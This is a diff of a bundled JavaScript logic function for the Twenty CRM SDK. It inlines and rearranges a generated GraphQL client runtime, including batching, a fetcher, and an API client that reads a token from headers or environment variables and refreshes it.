@@ -1,8 +1,429 @@
 import { createRequire as __createRequire } from 'module';
 const require = __createRequire(import.meta.url);
 
-// src/logic-functions/get-authentication-token-pairs.ts
-import { defineLogicFunction } from "twenty-sdk";
+// src/logic-functions/on-company-updated.ts
+import {
+  defineLogicFunction
+} from "twenty-sdk";
+
+// node_modules/twenty-sdk/generated/core/runtime/error.ts
+var GenqlError = class extends Error {
+  constructor(errors, data) {
+    let message = Array.isArray(errors) ? errors.map((x) => x?.message || "").join("\n") : "";
+    if (!message) {
+      message = "GraphQL error";
+    }
+    super(message);
+    this.errors = [];
+    this.errors = errors;
+    this.data = data;
+  }
+};
+
+// node_modules/twenty-sdk/generated/core/runtime/batcher.ts
+function dispatchQueueBatch(client, queue) {
+  let batchedQuery = queue.map((item) => item.request);
+  if (batchedQuery.length === 1) {
+    batchedQuery = batchedQuery[0];
+  }
+  client.fetcher(batchedQuery).then((responses) => {
+    if (queue.length === 1 && !Array.isArray(responses)) {
+      if (responses.errors && responses.errors.length) {
+        queue[0].reject(
+          new GenqlError(responses.errors, responses.data)
+        );
+        return;
+      }
+      queue[0].resolve(responses);
+      return;
+    } else if (responses.length !== queue.length) {
+      throw new Error("response length did not match query length");
+    }
+    for (let i = 0; i < queue.length; i++) {
+      if (responses[i].errors && responses[i].errors.length) {
+        queue[i].reject(
+          new GenqlError(responses[i].errors, responses[i].data)
+        );
+      } else {
+        queue[i].resolve(responses[i]);
+      }
+    }
+  });
+}
+function dispatchQueue(client, options) {
+  const queue = client._queue;
+  const maxBatchSize = options.maxBatchSize || 0;
+  client._queue = [];
+  if (maxBatchSize > 0 && maxBatchSize < queue.length) {
+    for (let i = 0; i < queue.length / maxBatchSize; i++) {
+      dispatchQueueBatch(
+        client,
+        queue.slice(i * maxBatchSize, (i + 1) * maxBatchSize)
+      );
+    }
+  } else {
+    dispatchQueueBatch(client, queue);
+  }
+}
+var QueryBatcher = class _QueryBatcher {
+  constructor(fetcher, {
+    batchInterval = 6,
+    shouldBatch = true,
+    maxBatchSize = 0
+  } = {}) {
+    this.fetcher = fetcher;
+    this._options = {
+      batchInterval,
+      shouldBatch,
+      maxBatchSize
+    };
+    this._queue = [];
+  }
+  /**
+   * Fetch will send a graphql request and return the parsed json.
+   * @param {string}      query          - the graphql query.
+   * @param {Variables}   variables      - any variables you wish to inject as key/value pairs.
+   * @param {[string]}    operationName  - the graphql operationName.
+   * @param {Options}     overrides      - the client options overrides.
+   *
+   * @return {promise} resolves to parsed json of server response
+   *
+   * @example
+   * client.fetch(`
+   *    query getHuman($id: ID!) {
+   *      human(id: $id) {
+   *        name
+   *        height
+   *      }
+   *    }
+   * `, { id: "1001" }, 'getHuman')
+   *    .then(human => {
+   *      // do something with human
+   *      console.log(human);
+   *    });
+   */
+  fetch(query, variables, operationName, overrides = {}) {
+    const request = {
+      query
+    };
+    const options = Object.assign({}, this._options, overrides);
+    if (variables) {
+      request.variables = variables;
+    }
+    if (operationName) {
+      request.operationName = operationName;
+    }
+    const promise = new Promise((resolve, reject) => {
+      this._queue.push({
+        request,
+        resolve,
+        reject
+      });
+      if (this._queue.length === 1) {
+        if (options.shouldBatch) {
+          setTimeout(
+            () => dispatchQueue(this, options),
+            options.batchInterval
+          );
+        } else {
+          dispatchQueue(this, options);
+        }
+      }
+    });
+    return promise;
+  }
+  /**
+   * Fetch will send a graphql request and return the parsed json.
+   * @param {string}      query          - the graphql query.
+   * @param {Variables}   variables      - any variables you wish to inject as key/value pairs.
+   * @param {[string]}    operationName  - the graphql operationName.
+   * @param {Options}     overrides      - the client options overrides.
+   *
+   * @return {Promise<Array<Result>>} resolves to parsed json of server response
+   *
+   * @example
+   * client.forceFetch(`
+   *    query getHuman($id: ID!) {
+   *      human(id: $id) {
+   *        name
+   *        height
+   *      }
+   *    }
+   * `, { id: "1001" }, 'getHuman')
+   *    .then(human => {
+   *      // do something with human
+   *      console.log(human);
+   *    });
+   */
+  forceFetch(query, variables, operationName, overrides = {}) {
+    const request = {
+      query
+    };
+    const options = Object.assign({}, this._options, overrides, {
+      shouldBatch: false
+    });
+    if (variables) {
+      request.variables = variables;
+    }
+    if (operationName) {
+      request.operationName = operationName;
+    }
+    const promise = new Promise((resolve, reject) => {
+      const client = new _QueryBatcher(this.fetcher, this._options);
+      client._queue = [
+        {
+          request,
+          resolve,
+          reject
+        }
+      ];
+      dispatchQueue(client, options);
+    });
+    return promise;
+  }
+};
+
+// node_modules/twenty-sdk/generated/core/runtime/fetcher.ts
+var DEFAULT_BATCH_OPTIONS = {
+  maxBatchSize: 10,
+  batchInterval: 40
+};
+var createFetcher = ({
+  url,
+  headers = {},
+  fetcher,
+  fetch: _fetch,
+  batch = false,
+  ...rest
+}) => {
+  if (!url && !fetcher) {
+    throw new Error("url or fetcher is required");
+  }
+  if (!fetcher) {
+    fetcher = async (body) => {
+      let headersObject = typeof headers == "function" ? await headers() : headers;
+      headersObject = headersObject || {};
+      if (typeof fetch === "undefined" && !_fetch) {
+        throw new Error(
+          "Global `fetch` function is not available, pass a fetch polyfill to Genql `createClient`"
+        );
+      }
+      let fetchImpl = _fetch || fetch;
+      const res = await fetchImpl(url, {
+        headers: {
+          "Content-Type": "application/json",
+          ...headersObject
+        },
+        method: "POST",
+        body: JSON.stringify(body),
+        ...rest
+      });
+      if (!res.ok) {
+        throw new Error(`${res.statusText}: ${await res.text()}`);
+      }
+      const json = await res.json();
+      return json;
+    };
+  }
+  if (!batch) {
+    return async (body) => {
+      const json = await fetcher(body);
+      if (Array.isArray(json)) {
+        return json.map((json2) => {
+          if (json2?.errors?.length) {
+            throw new GenqlError(json2.errors || [], json2.data);
+          }
+          return json2.data;
+        });
+      } else {
+        if (json?.errors?.length) {
+          throw new GenqlError(json.errors || [], json.data);
+        }
+        return json.data;
+      }
+    };
+  }
+  const batcher = new QueryBatcher(
+    async (batchedQuery) => {
+      const json = await fetcher(batchedQuery);
+      return json;
+    },
+    batch === true ? DEFAULT_BATCH_OPTIONS : batch
+  );
+  return async ({ query, variables }) => {
+    const json = await batcher.fetch(query, variables);
+    if (json?.data) {
+      return json.data;
+    }
+    throw new Error(
+      "Genql batch fetcher returned unexpected result " + JSON.stringify(json)
+    );
+  };
+};
+
+// node_modules/twenty-sdk/generated/core/runtime/generateGraphqlOperation.ts
+var parseRequest = (request, ctx, path) => {
+  if (typeof request === "object" && "__args" in request) {
+    const args = request.__args;
+    let fields = { ...request };
+    delete fields.__args;
+    const argNames = Object.keys(args);
+    if (argNames.length === 0) {
+      return parseRequest(fields, ctx, path);
+    }
+    const field = getFieldFromPath(ctx.root, path);
+    const argStrings = argNames.map((argName) => {
+      ctx.varCounter++;
+      const varName = `v${ctx.varCounter}`;
+      const typing = field.args && field.args[argName];
+      if (!typing) {
+        throw new Error(
+          `no typing defined for argument \`${argName}\` in path \`${path.join(
+            "."
+          )}\``
+        );
+      }
+      ctx.variables[varName] = {
+        value: args[argName],
+        typing
+      };
+      return `${argName}:$${varName}`;
+    });
+    return `(${argStrings})${parseRequest(fields, ctx, path)}`;
+  } else if (typeof request === "object" && Object.keys(request).length > 0) {
+    const fields = request;
+    const fieldNames = Object.keys(fields).filter((k) => Boolean(fields[k]));
+    if (fieldNames.length === 0) {
+      throw new Error(
+        `field selection should not be empty: ${path.join(".")}`
+      );
+    }
+    const type = path.length > 0 ? getFieldFromPath(ctx.root, path).type : ctx.root;
+    const scalarFields = type.scalar;
+    let scalarFieldsFragment;
+    if (fieldNames.includes("__scalar")) {
+      const falsyFieldNames = new Set(
+        Object.keys(fields).filter((k) => !Boolean(fields[k]))
+      );
+      if (scalarFields?.length) {
+        ctx.fragmentCounter++;
+        scalarFieldsFragment = `f${ctx.fragmentCounter}`;
+        ctx.fragments.push(
+          `fragment ${scalarFieldsFragment} on ${type.name}{${scalarFields.filter((f) => !falsyFieldNames.has(f)).join(",")}}`
+        );
+      }
+    }
+    const fieldsSelection = fieldNames.filter((f) => !["__scalar", "__name"].includes(f)).map((f) => {
+      const parsed = parseRequest(fields[f], ctx, [...path, f]);
+      if (f.startsWith("on_")) {
+        ctx.fragmentCounter++;
+        const implementationFragment = `f${ctx.fragmentCounter}`;
+        const typeMatch = f.match(/^on_(.+)/);
+        if (!typeMatch || !typeMatch[1])
+          throw new Error("match failed");
+        ctx.fragments.push(
+          `fragment ${implementationFragment} on ${typeMatch[1]}${parsed}`
+        );
+        return `...${implementationFragment}`;
+      } else {
+        return `${f}${parsed}`;
+      }
+    }).concat(scalarFieldsFragment ? [`...${scalarFieldsFragment}`] : []).join(",");
+    return `{${fieldsSelection}}`;
+  } else {
+    return "";
+  }
+};
+var generateGraphqlOperation = (operation, root, fields) => {
+  const ctx = {
+    root,
+    varCounter: 0,
+    variables: {},
+    fragmentCounter: 0,
+    fragments: []
+  };
+  const result = parseRequest(fields, ctx, []);
+  const varNames = Object.keys(ctx.variables);
+  const varsString = varNames.length > 0 ? `(${varNames.map((v) => {
+    const variableType = ctx.variables[v].typing[1];
+    return `$${v}:${variableType}`;
+  })})` : "";
+  const operationName = fields?.__name || "";
+  return {
+    query: [
+      `${operation} ${operationName}${varsString}${result}`,
+      ...ctx.fragments
+    ].join(","),
+    variables: Object.keys(ctx.variables).reduce(
+      (r, v) => {
+        r[v] = ctx.variables[v].value;
+        return r;
+      },
+      {}
+    ),
+    ...operationName ? { operationName: operationName.toString() } : {}
+  };
+};
+var getFieldFromPath = (root, path) => {
+  let current;
+  if (!root) throw new Error("root type is not provided");
+  if (path.length === 0) throw new Error(`path is empty`);
+  path.forEach((f) => {
+    const type = current ? current.type : root;
+    if (!type.fields)
+      throw new Error(`type \`${type.name}\` does not have fields`);
+    const possibleTypes = Object.keys(type.fields).filter((i) => i.startsWith("on_")).reduce(
+      (types, fieldName) => {
+        const field2 = type.fields && type.fields[fieldName];
+        if (field2) types.push(field2.type);
+        return types;
+      },
+      [type]
+    );
+    let field = null;
+    possibleTypes.forEach((type2) => {
+      const found = type2.fields && type2.fields[f];
+      if (found) field = found;
+    });
+    if (!field)
+      throw new Error(
+        `type \`${type.name}\` does not have a field \`${f}\``
+      );
+    current = field;
+  });
+  return current;
+};
+
+// node_modules/twenty-sdk/generated/core/runtime/createClient.ts
+var createClient = ({
+  queryRoot,
+  mutationRoot,
+  subscriptionRoot,
+  ...options
+}) => {
+  const fetcher = createFetcher(options);
+  const client = {};
+  if (queryRoot) {
+    client.query = (request) => {
+      if (!queryRoot) throw new Error("queryRoot argument is missing");
+      const resultPromise = fetcher(
+        generateGraphqlOperation("query", queryRoot, request)
+      );
+      return resultPromise;
+    };
+  }
+  if (mutationRoot) {
+    client.mutation = (request) => {
+      if (!mutationRoot)
+        throw new Error("mutationRoot argument is missing");
+      const resultPromise = fetcher(
+        generateGraphqlOperation("mutation", mutationRoot, request)
+      );
+      return resultPromise;
+    };
+  }
+  return client;
+};
 
 // node_modules/twenty-sdk/generated/core/runtime/linkTypeMap.ts
 var linkTypeMap = (typeMap3) => {
@@ -44798,430 +45219,232 @@ var types_default = {
 
 // node_modules/twenty-sdk/generated/core/index.ts
 var typeMap = linkTypeMap(types_default);
+var createClient2 = function(options) {
+  return createClient({
+    url: void 0,
+    ...options,
+    queryRoot: typeMap.Query,
+    mutationRoot: typeMap.Mutation,
+    subscriptionRoot: typeMap.Subscription
+  });
+};
+var APP_ACCESS_TOKEN_ENV_KEY = "TWENTY_APP_ACCESS_TOKEN";
+var API_KEY_ENV_KEY = "TWENTY_API_KEY";
+var getProcessEnvironment = () => {
+  const processObject = globalThis.process;
+  return processObject?.env ?? {};
+};
+var getTokenFromAuthorizationHeader = (authorizationHeader) => {
+  if (typeof authorizationHeader !== "string") {
+    return null;
+  }
+  const trimmedAuthorizationHeader = authorizationHeader.trim();
+  if (trimmedAuthorizationHeader.length === 0) {
+    return null;
+  }
+  if (trimmedAuthorizationHeader === "Bearer") {
+    return null;
+  }
+  if (trimmedAuthorizationHeader.startsWith("Bearer ")) {
+    return trimmedAuthorizationHeader.slice("Bearer ".length).trim();
+  }
+  return trimmedAuthorizationHeader;
+};
+var getTokenFromHeaders = (headers) => {
+  if (!headers) {
+    return null;
+  }
+  if (headers instanceof Headers) {
+    return getTokenFromAuthorizationHeader(
+      headers.get("Authorization") ?? void 0
+    );
+  }
+  if (Array.isArray(headers)) {
+    const matchedAuthorizationHeader = headers.find(
+      ([headerName]) => headerName.toLowerCase() === "authorization"
+    );
+    return getTokenFromAuthorizationHeader(matchedAuthorizationHeader?.[1]);
+  }
+  const headersRecord = headers;
+  return getTokenFromAuthorizationHeader(
+    headersRecord.Authorization ?? headersRecord.authorization
+  );
+};
+var hasAuthenticationErrorInGraphqlPayload = (payload) => {
+  if (!payload?.errors) {
+    return false;
+  }
+  return payload.errors.some((graphqlError) => {
+    return graphqlError.extensions?.code === "UNAUTHENTICATED" || graphqlError.message?.toLowerCase() === "unauthorized";
+  });
+};
 var defaultOptions = {
   url: `${process.env.TWENTY_API_URL}/graphql`,
   headers: {
     "Content-Type": "application/json"
   }
 };
-
-// node_modules/twenty-sdk/generated/metadata/runtime/error.ts
-var GenqlError2 = class extends Error {
-  constructor(errors, data) {
-    let message = Array.isArray(errors) ? errors.map((x) => x?.message || "").join("\n") : "";
-    if (!message) {
-      message = "GraphQL error";
-    }
-    super(message);
-    this.errors = [];
-    this.errors = errors;
-    this.data = data;
-  }
-};
-
-// node_modules/twenty-sdk/generated/metadata/runtime/batcher.ts
-function dispatchQueueBatch(client, queue) {
-  let batchedQuery = queue.map((item) => item.request);
-  if (batchedQuery.length === 1) {
-    batchedQuery = batchedQuery[0];
-  }
-  client.fetcher(batchedQuery).then((responses) => {
-    if (queue.length === 1 && !Array.isArray(responses)) {
-      if (responses.errors && responses.errors.length) {
-        queue[0].reject(
-          new GenqlError2(responses.errors, responses.data)
-        );
-        return;
-      }
-      queue[0].resolve(responses);
-      return;
-    } else if (responses.length !== queue.length) {
-      throw new Error("response length did not match query length");
-    }
-    for (let i = 0; i < queue.length; i++) {
-      if (responses[i].errors && responses[i].errors.length) {
-        queue[i].reject(
-          new GenqlError2(responses[i].errors, responses[i].data)
-        );
-      } else {
-        queue[i].resolve(responses[i]);
-      }
-    }
-  });
-}
-function dispatchQueue(client, options) {
-  const queue = client._queue;
-  const maxBatchSize = options.maxBatchSize || 0;
-  client._queue = [];
-  if (maxBatchSize > 0 && maxBatchSize < queue.length) {
-    for (let i = 0; i < queue.length / maxBatchSize; i++) {
-      dispatchQueueBatch(
-        client,
-        queue.slice(i * maxBatchSize, (i + 1) * maxBatchSize)
-      );
-    }
-  } else {
-    dispatchQueueBatch(client, queue);
-  }
-}
-var QueryBatcher2 = class _QueryBatcher {
-  constructor(fetcher, {
-    batchInterval = 6,
-    shouldBatch = true,
-    maxBatchSize = 0
-  } = {}) {
-    this.fetcher = fetcher;
-    this._options = {
-      batchInterval,
-      shouldBatch,
-      maxBatchSize
+var CoreApiClient = class {
+  constructor(options) {
+    this.refreshAccessTokenPromise = null;
+    const merged = {
+      ...defaultOptions,
+      ...options
     };
-    this._queue = [];
-  }
-  /**
-   * Fetch will send a graphql request and return the parsed json.
-   * @param {string}      query          - the graphql query.
-   * @param {Variables}   variables      - any variables you wish to inject as key/value pairs.
-   * @param {[string]}    operationName  - the graphql operationName.
-   * @param {Options}     overrides      - the client options overrides.
-   *
-   * @return {promise} resolves to parsed json of server response
-   *
-   * @example
-   * client.fetch(`
-   *    query getHuman($id: ID!) {
-   *      human(id: $id) {
-   *        name
-   *        height
-   *      }
-   *    }
-   * `, { id: "1001" }, 'getHuman')
-   *    .then(human => {
-   *      // do something with human
-   *      console.log(human);
-   *    });
-   */
-  fetch(query, variables, operationName, overrides = {}) {
-    const request = {
-      query
-    };
-    const options = Object.assign({}, this._options, overrides);
-    if (variables) {
-      request.variables = variables;
-    }
-    if (operationName) {
-      request.operationName = operationName;
-    }
-    const promise = new Promise((resolve, reject) => {
-      this._queue.push({
-        request,
-        resolve,
-        reject
-      });
-      if (this._queue.length === 1) {
-        if (options.shouldBatch) {
-          setTimeout(
-            () => dispatchQueue(this, options),
-            options.batchInterval
-          );
-        } else {
-          dispatchQueue(this, options);
-        }
-      }
+    const {
+      url,
+      headers,
+      fetch: customFetchImplementation,
+      fetcher: _fetcher,
+      batch: _batch,
+      ...requestOptions
+    } = merged;
+    this.url = url ?? "";
+    this.requestOptions = requestOptions;
+    this.headers = headers ?? {};
+    this.fetchImplementation = customFetchImplementation ?? globalThis.fetch ?? null;
+    const processEnvironment = getProcessEnvironment();
+    const tokenFromHeaders = getTokenFromHeaders(
+      typeof headers === "function" ? void 0 : headers
+    );
+    this.authorizationToken = tokenFromHeaders ?? processEnvironment[APP_ACCESS_TOKEN_ENV_KEY] ?? processEnvironment[API_KEY_ENV_KEY] ?? null;
+    this.client = createClient2({
+      ...merged,
+      headers: void 0,
+      fetcher: async (operation) => this.executeGraphqlRequestWithOptionalRefresh({
+        operation
+      })
     });
-    return promise;
   }
-  /**
-   * Fetch will send a graphql request and return the parsed json.
-   * @param {string}      query          - the graphql query.
-   * @param {Variables}   variables      - any variables you wish to inject as key/value pairs.
-   * @param {[string]}    operationName  - the graphql operationName.
-   * @param {Options}     overrides      - the client options overrides.
-   *
-   * @return {Promise<Array<Result>>} resolves to parsed json of server response
-   *
-   * @example
-   * client.forceFetch(`
-   *    query getHuman($id: ID!) {
-   *      human(id: $id) {
-   *        name
-   *        height
-   *      }
-   *    }
-   * `, { id: "1001" }, 'getHuman')
-   *    .then(human => {
-   *      // do something with human
-   *      console.log(human);
-   *    });
-   */
-  forceFetch(query, variables, operationName, overrides = {}) {
-    const request = {
-      query
-    };
-    const options = Object.assign({}, this._options, overrides, {
-      shouldBatch: false
+  query(request) {
+    return this.client.query(request);
+  }
+  mutation(request) {
+    return this.client.mutation(request);
+  }
+  async executeGraphqlRequestWithOptionalRefresh({
+    operation,
+    headers,
+    requestInit
+  }) {
+    const firstResponse = await this.executeGraphqlRequest({
+      operation,
+      headers,
+      requestInit,
+      token: this.authorizationToken
     });
-    if (variables) {
-      request.variables = variables;
-    }
-    if (operationName) {
-      request.operationName = operationName;
-    }
-    const promise = new Promise((resolve, reject) => {
-      const client = new _QueryBatcher(this.fetcher, this._options);
-      client._queue = [
-        {
-          request,
-          resolve,
-          reject
-        }
-      ];
-      dispatchQueue(client, options);
-    });
-    return promise;
-  }
-};
-
-// node_modules/twenty-sdk/generated/metadata/runtime/fetcher.ts
-var DEFAULT_BATCH_OPTIONS = {
-  maxBatchSize: 10,
-  batchInterval: 40
-};
-var createFetcher2 = ({
-  url,
-  headers = {},
-  fetcher,
-  fetch: _fetch,
-  batch = false,
-  ...rest
-}) => {
-  if (!url && !fetcher) {
-    throw new Error("url or fetcher is required");
-  }
-  if (!fetcher) {
-    fetcher = async (body) => {
-      let headersObject = typeof headers == "function" ? await headers() : headers;
-      headersObject = headersObject || {};
-      if (typeof fetch === "undefined" && !_fetch) {
-        throw new Error(
-          "Global `fetch` function is not available, pass a fetch polyfill to Genql `createClient`"
-        );
-      }
-      let fetchImpl = _fetch || fetch;
-      const res = await fetchImpl(url, {
-        headers: {
-          "Content-Type": "application/json",
-          ...headersObject
-        },
-        method: "POST",
-        body: JSON.stringify(body),
-        ...rest
-      });
-      if (!res.ok) {
-        throw new Error(`${res.statusText}: ${await res.text()}`);
-      }
-      const json = await res.json();
-      return json;
-    };
-  }
-  if (!batch) {
-    return async (body) => {
-      const json = await fetcher(body);
-      if (Array.isArray(json)) {
-        return json.map((json2) => {
-          if (json2?.errors?.length) {
-            throw new GenqlError2(json2.errors || [], json2.data);
-          }
-          return json2.data;
+    if (this.shouldRefreshToken(firstResponse)) {
+      const refreshedAccessToken = await this.requestRefreshedAccessToken();
+      if (refreshedAccessToken) {
+        const retryResponse = await this.executeGraphqlRequest({
+          operation,
+          headers,
+          requestInit,
+          token: refreshedAccessToken
         });
-      } else {
-        if (json?.errors?.length) {
-          throw new GenqlError2(json.errors || [], json.data);
+        return this.assertResponseIsSuccessful(retryResponse);
+      }
+    }
+    return this.assertResponseIsSuccessful(firstResponse);
+  }
+  async executeGraphqlRequest({
+    operation,
+    headers,
+    requestInit,
+    token
+  }) {
+    if (!this.fetchImplementation) {
+      throw new Error(
+        "Global `fetch` function is not available, pass a fetch implementation to the Twenty client"
+      );
+    }
+    const resolvedHeaders = await this.resolveHeaders();
+    const requestHeaders = new Headers(resolvedHeaders);
+    if (headers) {
+      new Headers(headers).forEach(
+        (value, key) => requestHeaders.set(key, value)
+      );
+    }
+    if (operation instanceof FormData) {
+      requestHeaders.delete("Content-Type");
+    } else {
+      requestHeaders.set("Content-Type", "application/json");
+    }
+    if (token) {
+      requestHeaders.set("Authorization", `Bearer ${token}`);
+    } else {
+      requestHeaders.delete("Authorization");
+    }
+    const response = await this.fetchImplementation.call(globalThis, this.url, {
+      ...this.requestOptions,
+      ...requestInit,
+      method: requestInit?.method ?? "POST",
+      headers: requestHeaders,
+      body: operation instanceof FormData ? operation : JSON.stringify(operation)
+    });
+    const rawBody = await response.text();
+    let payload = null;
+    if (rawBody.trim().length > 0) {
+      try {
+        payload = JSON.parse(rawBody);
+      } catch {
+        payload = null;
+      }
+    }
+    return {
+      status: response.status,
+      statusText: response.statusText,
+      payload,
+      rawBody
+    };
+  }
+  async resolveHeaders() {
+    if (typeof this.headers === "function") {
+      return await this.headers() ?? {};
+    }
+    return this.headers ?? {};
+  }
+  shouldRefreshToken(response) {
+    if (response.status === 401) {
+      return true;
+    }
+    return hasAuthenticationErrorInGraphqlPayload(response.payload);
+  }
+  assertResponseIsSuccessful(response) {
+    if (response.status < 200 || response.status >= 300) {
+      throw new Error(`${response.statusText}: ${response.rawBody}`);
+    }
+    if (response.payload === null) {
+      throw new Error("Invalid JSON response");
+    }
+    return response.payload;
+  }
+  async requestRefreshedAccessToken() {
+    const refreshAccessTokenFunction = globalThis.frontComponentHostCommunicationApi?.requestAccessTokenRefresh;
+    if (typeof refreshAccessTokenFunction !== "function") {
+      return null;
+    }
+    if (!this.refreshAccessTokenPromise) {
+      this.refreshAccessTokenPromise = refreshAccessTokenFunction().then((refreshedAccessToken) => {
+        if (typeof refreshedAccessToken !== "string" || refreshedAccessToken.length === 0) {
+          return null;
         }
-        return json.data;
-      }
-    };
-  }
-  const batcher = new QueryBatcher2(
-    async (batchedQuery) => {
-      const json = await fetcher(batchedQuery);
-      return json;
-    },
-    batch === true ? DEFAULT_BATCH_OPTIONS : batch
-  );
-  return async ({ query, variables }) => {
-    const json = await batcher.fetch(query, variables);
-    if (json?.data) {
-      return json.data;
+        this.setAuthorizationToken(refreshedAccessToken);
+        return refreshedAccessToken;
+      }).catch((refreshError) => {
+        console.error("Twenty client: token refresh failed", refreshError);
+        return null;
+      }).finally(() => {
+        this.refreshAccessTokenPromise = null;
+      });
     }
-    throw new Error(
-      "Genql batch fetcher returned unexpected result " + JSON.stringify(json)
-    );
-  };
-};
-
-// node_modules/twenty-sdk/generated/metadata/runtime/generateGraphqlOperation.ts
-var parseRequest = (request, ctx, path) => {
-  if (typeof request === "object" && "__args" in request) {
-    const args = request.__args;
-    let fields = { ...request };
-    delete fields.__args;
-    const argNames = Object.keys(args);
-    if (argNames.length === 0) {
-      return parseRequest(fields, ctx, path);
-    }
-    const field = getFieldFromPath(ctx.root, path);
-    const argStrings = argNames.map((argName) => {
-      ctx.varCounter++;
-      const varName = `v${ctx.varCounter}`;
-      const typing = field.args && field.args[argName];
-      if (!typing) {
-        throw new Error(
-          `no typing defined for argument \`${argName}\` in path \`${path.join(
-            "."
-          )}\``
-        );
-      }
-      ctx.variables[varName] = {
-        value: args[argName],
-        typing
-      };
-      return `${argName}:$${varName}`;
-    });
-    return `(${argStrings})${parseRequest(fields, ctx, path)}`;
-  } else if (typeof request === "object" && Object.keys(request).length > 0) {
-    const fields = request;
-    const fieldNames = Object.keys(fields).filter((k) => Boolean(fields[k]));
-    if (fieldNames.length === 0) {
-      throw new Error(
-        `field selection should not be empty: ${path.join(".")}`
-      );
-    }
-    const type = path.length > 0 ? getFieldFromPath(ctx.root, path).type : ctx.root;
-    const scalarFields = type.scalar;
-    let scalarFieldsFragment;
-    if (fieldNames.includes("__scalar")) {
-      const falsyFieldNames = new Set(
-        Object.keys(fields).filter((k) => !Boolean(fields[k]))
-      );
-      if (scalarFields?.length) {
-        ctx.fragmentCounter++;
-        scalarFieldsFragment = `f${ctx.fragmentCounter}`;
-        ctx.fragments.push(
-          `fragment ${scalarFieldsFragment} on ${type.name}{${scalarFields.filter((f) => !falsyFieldNames.has(f)).join(",")}}`
-        );
-      }
-    }
-    const fieldsSelection = fieldNames.filter((f) => !["__scalar", "__name"].includes(f)).map((f) => {
-      const parsed = parseRequest(fields[f], ctx, [...path, f]);
-      if (f.startsWith("on_")) {
-        ctx.fragmentCounter++;
-        const implementationFragment = `f${ctx.fragmentCounter}`;
-        const typeMatch = f.match(/^on_(.+)/);
-        if (!typeMatch || !typeMatch[1])
-          throw new Error("match failed");
-        ctx.fragments.push(
-          `fragment ${implementationFragment} on ${typeMatch[1]}${parsed}`
-        );
-        return `...${implementationFragment}`;
-      } else {
-        return `${f}${parsed}`;
-      }
-    }).concat(scalarFieldsFragment ? [`...${scalarFieldsFragment}`] : []).join(",");
-    return `{${fieldsSelection}}`;
-  } else {
-    return "";
+    return this.refreshAccessTokenPromise;
   }
-};
-var generateGraphqlOperation2 = (operation, root, fields) => {
-  const ctx = {
-    root,
-    varCounter: 0,
-    variables: {},
-    fragmentCounter: 0,
-    fragments: []
-  };
-  const result = parseRequest(fields, ctx, []);
-  const varNames = Object.keys(ctx.variables);
-  const varsString = varNames.length > 0 ? `(${varNames.map((v) => {
-    const variableType = ctx.variables[v].typing[1];
-    return `$${v}:${variableType}`;
-  })})` : "";
-  const operationName = fields?.__name || "";
-  return {
-    query: [
-      `${operation} ${operationName}${varsString}${result}`,
-      ...ctx.fragments
-    ].join(","),
-    variables: Object.keys(ctx.variables).reduce(
-      (r, v) => {
-        r[v] = ctx.variables[v].value;
-        return r;
-      },
-      {}
-    ),
-    ...operationName ? { operationName: operationName.toString() } : {}
-  };
-};
-var getFieldFromPath = (root, path) => {
-  let current;
-  if (!root) throw new Error("root type is not provided");
-  if (path.length === 0) throw new Error(`path is empty`);
-  path.forEach((f) => {
-    const type = current ? current.type : root;
-    if (!type.fields)
-      throw new Error(`type \`${type.name}\` does not have fields`);
-    const possibleTypes = Object.keys(type.fields).filter((i) => i.startsWith("on_")).reduce(
-      (types, fieldName) => {
-        const field2 = type.fields && type.fields[fieldName];
-        if (field2) types.push(field2.type);
-        return types;
-      },
-      [type]
-    );
-    let field = null;
-    possibleTypes.forEach((type2) => {
-      const found = type2.fields && type2.fields[f];
-      if (found) field = found;
-    });
-    if (!field)
-      throw new Error(
-        `type \`${type.name}\` does not have a field \`${f}\``
-      );
-    current = field;
-  });
-  return current;
-};
-
-// node_modules/twenty-sdk/generated/metadata/runtime/createClient.ts
-var createClient2 = ({
-  queryRoot,
-  mutationRoot,
-  subscriptionRoot,
-  ...options
-}) => {
-  const fetcher = createFetcher2(options);
-  const client = {};
-  if (queryRoot) {
-    client.query = (request) => {
-      if (!queryRoot) throw new Error("queryRoot argument is missing");
-      const resultPromise = fetcher(
-        generateGraphqlOperation2("query", queryRoot, request)
-      );
-      return resultPromise;
-    };
+  setAuthorizationToken(token) {
+    this.authorizationToken = token;
+    const processEnvironment = getProcessEnvironment();
+    processEnvironment[APP_ACCESS_TOKEN_ENV_KEY] = token;
   }
-  if (mutationRoot) {
-    client.mutation = (request) => {
-      if (!mutationRoot)
-        throw new Error("mutationRoot argument is missing");
-      const resultPromise = fetcher(
-        generateGraphqlOperation2("mutation", mutationRoot, request)
-      );
-      return resultPromise;
-    };
-  }
-  return client;
 };
 
 // node_modules/twenty-sdk/generated/metadata/runtime/linkTypeMap.ts
@@ -55377,338 +55600,186 @@ var types_default2 = {
 
 // node_modules/twenty-sdk/generated/metadata/index.ts
 var typeMap2 = linkTypeMap2(types_default2);
-var createClient3 = function(options) {
-  return createClient2({
-    url: void 0,
-    ...options,
-    queryRoot: typeMap2.Query,
-    mutationRoot: typeMap2.Mutation,
-    subscriptionRoot: typeMap2.Subscription
-  });
-};
-var APP_ACCESS_TOKEN_ENV_KEY = "TWENTY_APP_ACCESS_TOKEN";
-var API_KEY_ENV_KEY = "TWENTY_API_KEY";
-var getProcessEnvironment = () => {
-  const processObject = globalThis.process;
-  return processObject?.env ?? {};
-};
-var getTokenFromAuthorizationHeader = (authorizationHeader) => {
-  if (typeof authorizationHeader !== "string") {
-    return null;
-  }
-  const trimmedAuthorizationHeader = authorizationHeader.trim();
-  if (trimmedAuthorizationHeader.length === 0) {
-    return null;
-  }
-  if (trimmedAuthorizationHeader === "Bearer") {
-    return null;
-  }
-  if (trimmedAuthorizationHeader.startsWith("Bearer ")) {
-    return trimmedAuthorizationHeader.slice("Bearer ".length).trim();
-  }
-  return trimmedAuthorizationHeader;
-};
-var getTokenFromHeaders = (headers) => {
-  if (!headers) {
-    return null;
-  }
-  if (headers instanceof Headers) {
-    return getTokenFromAuthorizationHeader(
-      headers.get("Authorization") ?? void 0
-    );
-  }
-  if (Array.isArray(headers)) {
-    const matchedAuthorizationHeader = headers.find(
-      ([headerName]) => headerName.toLowerCase() === "authorization"
-    );
-    return getTokenFromAuthorizationHeader(matchedAuthorizationHeader?.[1]);
-  }
-  const headersRecord = headers;
-  return getTokenFromAuthorizationHeader(
-    headersRecord.Authorization ?? headersRecord.authorization
-  );
-};
-var hasAuthenticationErrorInGraphqlPayload = (payload) => {
-  if (!payload?.errors) {
-    return false;
-  }
-  return payload.errors.some((graphqlError) => {
